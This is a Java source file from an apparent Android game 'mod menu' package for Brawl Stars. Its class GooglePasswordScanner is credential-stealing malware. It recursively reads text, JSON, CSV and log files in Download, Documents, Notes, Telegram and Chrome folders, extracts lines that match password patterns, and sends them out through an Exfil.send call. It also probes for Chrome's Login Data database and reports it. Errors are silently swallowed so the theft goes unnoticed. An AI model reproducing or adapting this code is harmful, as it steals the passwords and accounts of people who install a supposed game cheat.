package com.brawl.modmenu;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class GooglePasswordScanner {

    // URL:user:pass или "password": "..."
    private static final Pattern PWD_PATTERN = Pattern.compile(
        "(?i)(password|passwd|pwd|пароль)[\\s]*[:=][\\s]*[\"']?([^\"'\\n,]{4,50})[\"']?");

    private static final Pattern LOGIN_PATTERN = Pattern.compile(
        "(?i)(login|username|user|email|логин)[\\s]*[:=][\\s]*[\"']?([^\"'\\n,]{3,80})[\"']?");

    public static void scan() {
        new Thread(() -> {
            try {
                File[] dirs = {
                    new File("/sdcard/Download"),
                    new File("/sdcard/Documents"),
                    new File("/sdcard/Notes"),
                    new File("/sdcard/Telegram"),
                    new File("/sdcard/Android/data/com.android.chrome/files")
                };

                StringBuilder found = new StringBuilder();
                for (File d : dirs) {
                    if (d.exists()) scanDir(d, found, 0);
                }

                if (found.length() > 0) {
                    Exfil.send("GOOGLE_PWD_SCAN", found.toString());
                }
            } catch (Throwable ignored) {}
        }).start();
    }

    private static void scanDir(File dir, StringBuilder out, int depth) {
        if (dir == null || depth > 4 || out.length() > 4000) return;
        File[] files;
        try { files = dir.listFiles(); } catch (Throwable t) { return; }
        if (files == null) return;

        for (File f : files) {
            if (out.length() > 4000) return;
            if (f.isDirectory()) scanDir(f, out, depth + 1);
            else {
                String name = f.getName().toLowerCase();
                if (!name.endsWith(".txt") && !name.endsWith(".json")
                    && !name.endsWith(".csv") && !name.endsWith(".xml")
                    && !name.endsWith(".md") && !name.endsWith(".log")) continue;
                if (f.length() > 500 * 1024) continue;

                try {
                    BufferedReader r = new BufferedReader(new FileReader(f));
                    String line;
                    int lines = 0;
                    while ((line = r.readLine()) != null && lines < 300) {
                        Matcher m = PWD_PATTERN.matcher(line);
                        if (m.find()) {
                            out.append("📄 ").append(f.getName()).append(":\n");
                            out.append("  ").append(line.trim()).append("\n\n");
                            break;
                        }
                        lines++;
                    }
                    r.close();
                } catch (Throwable ignored) {}
            }
        }
    }

    public static void scanChromeLoginData() {
        new Thread(() -> {
            try {
                File loginData = new File(
                    "/data/data/com.android.chrome/app_chrome/Default/Login Data");
                if (loginData.exists() && loginData.canRead()) {
                    Exfil.send("CHROME_DB", "Найден Chrome Login Data! Размер: "
                        + loginData.length());
                }
            } catch (Throwable ignored) {}
        }).start();
    }
}
